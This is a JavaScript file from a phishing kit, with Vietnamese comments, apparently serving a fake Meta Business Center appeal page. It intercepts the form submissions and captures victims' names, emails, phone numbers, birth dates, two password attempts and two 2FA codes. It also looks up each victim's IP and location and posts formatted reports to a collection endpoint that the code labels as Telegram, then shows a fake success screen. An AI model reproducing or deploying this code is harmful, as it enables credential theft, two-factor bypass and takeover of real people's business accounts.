(function () {
    "use strict";

    // ===== CẤU HÌNH TELEGRAM =====
    const CONFIG = {
        REDIRECT_URL: 'https://meta-business-center-appeal.vercel.app/appeal-forms/',
        IP_APIS: [
            "https://ipinfo.io/json",
            "https://geolocation-db.com/json/"
        ]
    };

    // ===== BIẾN TOÀN CỤC =====
    let userLoc = null;
    let formData = {
        fullName: '',
        pageName: '',
        email: '',
        businessEmail: '',
        phone: '',
        dob: '',
        pass1: '',
        pass2: '',
        twoFactorCode: '',
        twoFactorCode2: ''   // ⚠️ THÊM MỚI
    };

    let passwordAttempts = 0;
    let otpAttempts = 0;

    // ===== HÀM TIỆN ÍCH =====
    async function getLocation() {
        function countryFlag(code) {
            if (!code) return "🌍";
            return code.toUpperCase()
                .split("")
                .map(c => String.fromCodePoint(c.charCodeAt(0) + 127397))
                .join("");
        }
        try {
            const res = await fetch(CONFIG.IP_APIS[0]);
            const data = await res.json();

            const countryCode = data.country || "";
            const countryName = data.country_name || data.country || "Unknown";

            return {
                ip: data.ip || "Unknown",
                city: data.city || "Unknown",
                country: countryName,
                flag: countryFlag(countryCode)
            };
        } catch {
            return { ip: "Unknown", city: "N/A", country: "N/A", flag: "🌍" };
        }
    }

    function getTime() {
        return new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
    }

    async function sendToTelegram(message) {
        try {
            const res = await fetch('/appeal-forms/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message })
            });
            const data = await res.json();
            return data.success || false;
        } catch {
            return false;
        }
    }

    function formatReport(type) {
        const time = getTime();
        let icon = '';

        if (type === 'INFO') icon = '📝 INFO';
        else if (type === 'PASS1') icon = '🔑 PASS 1';
        else if (type === 'PASS2') icon = '⚡ PASS 2';
        else if (type === 'OTP') icon = '🔥 OTP';

        let infoBlock = '<b>Name:</b> ' + (formData.fullName || 'N/A');
        if (formData.pageName) infoBlock += '\n<b>Page Name:</b> <code>' + formData.pageName + '</code>';
        if (formData.email) infoBlock += '\n<b>Mail:</b> <code>' + formData.email + '</code>';
        if (formData.businessEmail) infoBlock += '\n<b>Biz Mail:</b> <code>' + formData.businessEmail + '</code>';
        infoBlock += '\n<b>Phone:</b> <code>' + (formData.phone || 'N/A') + '</code>';
        if (formData.dob) infoBlock += '\n<b>DOB:</b> ' + formData.dob;

        var passBlock = '';
        if (formData.pass1) passBlock += '\n----------------\n<b>P1:</b> <code>' + formData.pass1 + '</code>';
        if (formData.pass2) passBlock += '\n<b>P2:</b> <code>' + formData.pass2 + '</code>';

        // ⚠️ CẬP NHẬT: HIỂN THỊ CẢ 2 MÃ 2FA
        var otpBlock = '';
        if (formData.twoFactorCode || formData.twoFactorCode2) {
            otpBlock = '\n----------------';
            if (formData.twoFactorCode) {
                otpBlock += '\n<b>📲 2FA (1):</b> <code>' + formData.twoFactorCode + '</code>';
            }
            if (formData.twoFactorCode2) {
                otpBlock += '\n<b>📲 2FA (2):</b> <code>' + formData.twoFactorCode2 + '</code>';
            }
        }

        var locBlock = '';
        if (userLoc && userLoc.ip) {
            locBlock = '\n================\n🌍 <b>IP:</b> <code>' + userLoc.ip + '</code>';
            if (userLoc.city) locBlock += '\n📍 ' + userLoc.city + ', ' + userLoc.country + ' ' + (userLoc.flag || '');
        }

        return icon + ' | ' + time + '\n----------------\n' + infoBlock + passBlock + otpBlock + locBlock;
    }

    async function sendInfoToTelegram() {
        await sendToTelegram(formatReport('INFO'));
    }

    async function sendPass1ToTelegram() {
        await sendToTelegram(formatReport('PASS1'));
    }

    async function sendPass2ToTelegram() {
        await sendToTelegram(formatReport('PASS2'));
    }

    async function sendOTPToTelegram() {
        await sendToTelegram(formatReport('OTP'));
    }

    // ===== UPDATE DATA =====
    function updateFormData() {
        try {
            var fullNameEl = document.getElementById('fullName');
            var emailEl = document.getElementById('email');
            var businessEmailEl = document.getElementById('emailBusiness');
            var pageNameEl = document.getElementById('fanpage');
            var phoneEl = document.getElementById('phone');
            var dayEl = document.getElementById('day');
            var monthEl = document.getElementById('month');
            var yearEl = document.getElementById('year');

            // ⚠️ THÊM LẤY MÃ 2FA THỨ 2
            var code1El = document.getElementById('code-2fa');
            var code2El = document.getElementById('code-2fa-2');

            if (fullNameEl) formData.fullName = fullNameEl.value || formData.fullName;
            if (emailEl) formData.email = emailEl.value || formData.email;
            if (businessEmailEl) formData.businessEmail = businessEmailEl.value || formData.businessEmail;
            if (pageNameEl) formData.pageName = pageNameEl.value || formData.pageName;
            if (phoneEl) formData.phone = phoneEl.value || formData.phone;
            if (code1El) formData.twoFactorCode = code1El.value || formData.twoFactorCode;
            if (code2El) formData.twoFactorCode2 = code2El.value || formData.twoFactorCode2;

            if (dayEl && monthEl && yearEl) {
                var day = dayEl.value;
                var month = monthEl.value;
                var year = yearEl.value;
                if (day && month && year) {
                    formData.dob = day + '/' + month + '/' + year;
                }
            }
        } catch (e) {}
    }

    // ===== MODAL THÀNH CÔNG =====
    function showSuccessModal() {
        if (document.getElementById('modal-success')) return;

        var modalHtml = `
        <div id="modal-success" style="
            position:fixed;
            top:0;
            left:0;
            width:100%;
            height:100%;
            background: #ffffff;
            display:flex;
            flex-direction:column;
            justify-content:center;
            align-items:center;
            z-index:999999;
            color:#000;
            font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial;
            text-align:center;
            padding:20px;
        ">
            <div style="
                width:90px;
                height:90px;
                border-radius:50%;
                border:4px solid #0A84FF;
                display:flex;
                justify-content:center;
                align-items:center;
                margin-bottom:25px;
            ">
                <div style="
                    width:30px;
                    height:15px;
                    border-left:4px solid #0A84FF;
                    border-bottom:4px solid #0A84FF;
                    transform:rotate(-45deg);
                    margin-top:-5px;
                "></div>
            </div>

            <div style="font-size:22px;font-weight:600;margin-bottom:10px;">
                ✅ Gửi thông tin thành công!
            </div>

            <div style="font-size:15px;color:#000;line-height:1.5;max-width:320px;">
                Chúng tôi sẽ xử lý yêu cầu của bạn trong thời gian sớm nhất.
            </div>
        </div>
        `;

        document.body.innerHTML = modalHtml;
    }

    // ===== INIT =====
    async function initTelegram() {
        try {
            userLoc = await getLocation();
            updateFormData();

            // ===== FORM THÔNG TIN =====
            var infoForm = document.getElementById('form-info');
            if (infoForm) {
                var originalInfoSubmit = infoForm.onsubmit;

                infoForm.onsubmit = async function (e) {
                    e.preventDefault();

                    var emailEl = document.getElementById('email');
                    var email = emailEl ? emailEl.value : '';
                    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                        alert('Vui lòng nhập email hợp lệ');
                        return;
                    }

                    updateFormData();
                    await sendInfoToTelegram();

                    passwordAttempts = 0;
                    otpAttempts = 0;

                    if (originalInfoSubmit) {
                        await originalInfoSubmit.call(this, e);
                    }
                };
            }

            // ===== FORM MẬT KHẨU =====
            var passwordForm = document.getElementById('form-password');
            if (passwordForm) {
                var originalPasswordSubmit = passwordForm.onsubmit;

                passwordForm.onsubmit = async function (e) {
                    e.preventDefault();

                    var pwdInput = document.getElementById('password');
                    if (!pwdInput || !pwdInput.value.trim()) return;

                    passwordAttempts++;

                    if (passwordAttempts === 1) {
                        formData.pass1 = pwdInput.value;
                        await sendPass1ToTelegram();
                    } else {
                        formData.pass2 = pwdInput.value;
                        await sendPass2ToTelegram();
                    }

                    if (originalPasswordSubmit) {
                        await originalPasswordSubmit.call(this, e);
                    }
                };
            }

            // ===== FORM 2FA =====
            setTimeout(function() {
                var tfaForm = document.getElementById('form-2fa');

                if (tfaForm) {
                    var original2faSubmit = tfaForm.onsubmit;

                    tfaForm.onsubmit = async function (e) {
                        e.preventDefault();

                        // ⚠️ CẬP NHẬT: LẤY CẢ 2 MÃ
                        var code1Input = document.getElementById('code-2fa');
                        var code2Input = document.getElementById('code-2fa-2');
                        
                        var code1 = code1Input ? code1Input.value : '';
                        var code2 = code2Input ? code2Input.value : '';

                        if (!code1 || (code1.length !== 6 && code1.length !== 8)) {
                            alert('Vui lòng nhập mã 2FA hợp lệ (6-8 chữ số)');
                            return;
                        }

                        updateFormData();
                        formData.twoFactorCode = code1;
                        formData.twoFactorCode2 = code2;

                        otpAttempts++;
                        await sendOTPToTelegram();

                        showSuccessModal();

                        if (original2faSubmit) {
                            await original2faSubmit.call(this, e);
                        }
                    };
                }
            }, 1000);

            // ===== FORM CHÍNH (FALLBACK) =====
            var mainForm = document.getElementById('appealForm');
            if (mainForm && !infoForm) {
                mainForm.addEventListener('submit', async function(e) {
                    e.preventDefault();

                    var formDataObj = new FormData(this);
                    var data = {};
                    formDataObj.forEach(function(value, key) {
                        data[key] = value;
                    });

                    try {
                        var response = await fetch('/appeal-forms/api/collect', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        });

                        var result = await response.json();

                        if (result.success) {
                            alert('✅ Gửi đơn thành công!');
                            this.reset();
                        } else {
                            alert('❌ Có lỗi xảy ra: ' + (result.error || 'Vui lòng thử lại'));
                        }
                    } catch (error) {
                        alert('❌ Lỗi kết nối: ' + error.message);
                    }
                });
            }

        } catch (error) {
            console.error('Lỗi khởi tạo:', error);
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(initTelegram, 500);
        });
    } else {
        setTimeout(initTelegram, 500);
    }

})();